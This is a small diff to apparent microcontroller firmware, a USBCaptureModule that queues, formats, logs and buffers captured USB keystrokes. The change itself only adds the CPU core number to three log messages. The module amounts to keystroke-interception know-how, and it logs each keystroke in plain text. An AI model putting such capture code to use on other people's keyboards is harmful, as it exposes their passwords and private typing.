@@ -106,7 +106,7 @@ USBCaptureModule::USBCaptureModule() : concurrency::OSThread("USBCapture")
 
 bool USBCaptureModule::init()
 {
-    LOG_INFO("USB Capture Module initializing...");
+    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());
 
     /* Initialize keystroke queue */
     keystroke_queue_init(keystroke_queue);
@@ -186,7 +186,7 @@ void USBCaptureModule::processKeystrokeQueue()
 
         /* Format and log the keystroke */
         formatKeystrokeEvent(&event, log_buffer, sizeof(log_buffer));
-        LOG_INFO("Keystroke: %s", log_buffer);
+        LOG_INFO("[Core%u] Keystroke: %s", get_core_num(), log_buffer);
 
         /* Add to keystroke buffer based on event type */
         bool added = false;
@@ -240,7 +240,7 @@ void USBCaptureModule::processKeystrokeQueue()
     {
         uint32_t count = keystroke_queue_count(keystroke_queue);
         uint32_t dropped = keystroke_queue_get_dropped_count(keystroke_queue);
-        LOG_DEBUG("Queue stats: count=%u, dropped=%u", count, dropped);
+        LOG_DEBUG("[Core%u] Queue stats: count=%u, dropped=%u", get_core_num(), count, dropped);
         last_stats_time = now;
     }
 }
